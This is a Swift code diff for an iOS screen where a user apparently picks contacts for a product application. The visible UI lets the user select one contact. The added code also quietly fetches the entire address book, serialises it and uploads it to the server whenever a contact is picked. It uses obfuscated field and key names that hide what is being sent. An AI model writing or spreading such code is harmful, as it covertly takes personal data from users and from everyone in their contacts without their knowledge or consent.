@@ -8,8 +8,13 @@
 import UIKit
 import SnapKit
 import TYAlertController
+import Contacts
+import RxSwift
+import RxCocoa
 
 class PhonesViewController: BaseViewController {
+    
+    let disposeBag = DisposeBag()
     
     var productID: String = ""
     
@@ -119,7 +124,40 @@ class PhonesViewController: BaseViewController {
             make.centerX.equalToSuperview()
             make.bottom.equalTo(nextButton.snp.top).offset(-5)
         }
-    
+        
+        nextButton.rx.tap.bind(onNext: { [weak self] in
+            guard let self = self else { return }
+            var phoneArray: [[String: String]] = []
+            for model in listArray {
+                let concurrent = model.concurrent ?? ""
+                let inserts = model.inserts ?? ""
+                let hull = model.hull ?? ""
+                let dict = ["concurrent": concurrent,
+                            "inserts": inserts,
+                            "hull": hull
+                ]
+                phoneArray.append(dict)
+            }
+            
+            var jsonSring: String = ""
+            
+            do {
+                let jsonData = try JSONSerialization.data(withJSONObject: phoneArray, options: [])
+                if let jsonString = String(data: jsonData, encoding: .utf8) {
+                    jsonSring = jsonString
+                }
+            } catch {
+                print("Failed JSON: \(error)")
+            }
+            
+            let json = ["cannot": productID, "combined": jsonSring]
+            
+            Task {
+                await self.savePersonalInfo(with: json)
+            }
+            
+        }).disposed(by: disposeBag)
+        
         Task {
             await self.getPersonalInfo()
         }
@@ -147,6 +185,27 @@ extension PhonesViewController {
         }
     }
     
+    private func savePersonalInfo(with json: [String: String]) async {
+        do {
+            let model = try await viewModel.savePersonalDetailInfo(json: json)
+            if model.somewhat == 0 {
+                self.backToListPageVc()
+            }else {
+                ToastManager.showMessage(message: model.conversion ?? "")
+            }
+        } catch  {
+            
+        }
+    }
+    
+    private func saveAllPersonalInfo(with json: [String: String]) async {
+        do {
+            let _ = try await viewModel.saveAllPhoneslInfo(json: json)
+        } catch  {
+            
+        }
+    }
+    
 }
 
 extension PhonesViewController: UITableViewDelegate, UITableViewDataSource {
@@ -167,6 +226,8 @@ extension PhonesViewController: UITableViewDelegate, UITableViewDataSource {
         
         cell.phoneBlock = { [weak self] in
             guard let self = self else { return }
+            self.selectSingleContact(with: cell, model: model)
+            self.getAllContacts()
         }
         
         return cell
@@ -198,6 +259,46 @@ extension PhonesViewController: UITableViewDelegate, UITableViewDataSource {
             self.dismiss(animated: true) {
                 cell.oneListView.nameTextFiled.text = model.concurrent ?? ""
                 listmodel.inserts = model.complications ?? ""
+            }
+        }
+    }
+    
+}
+
+extension PhonesViewController {
+    
+    func getAllContacts() {
+        ContactManager.shared.fetchAllContacts(on: self) { [weak self] contacts in
+            if contacts.isEmpty {
+                return
+            }
+            do {
+                let jsonData = try JSONEncoder().encode(contacts)
+                if let jsonString = String(data: jsonData, encoding: .utf8) {
+                    Task {
+                        let json = ["combined": jsonString]
+                        await self?.saveAllPersonalInfo(with: json)
+                    }
+                }
+            } catch {
+                print("Error encoding JSON:", error)
+            }
+        }
+    }
+    
+    func selectSingleContact(with cell: PhonesTableViewCell, model: artificialModel) {
+        ContactManager.shared.selectSingleContact(on: self) { contact in
+            guard let contact = contact else { return }
+            let givenName = contact.givenName
+            let familyName = contact.familyName
+            let phoneNumber = contact.phoneNumbers.first?.value.stringValue ?? ""
+            
+            let name = [givenName, familyName].joined(separator: " ").trimmingCharacters(in: .whitespaces)
+            let displayText = phoneNumber.isEmpty ? name : "\(name)-\(phoneNumber)"
+            model.concurrent = name
+            model.hull = phoneNumber
+            DispatchQueue.main.async {
+                cell.twoListView.nameTextFiled.text = displayText.isEmpty ? "" : displayText
             }
         }
     }
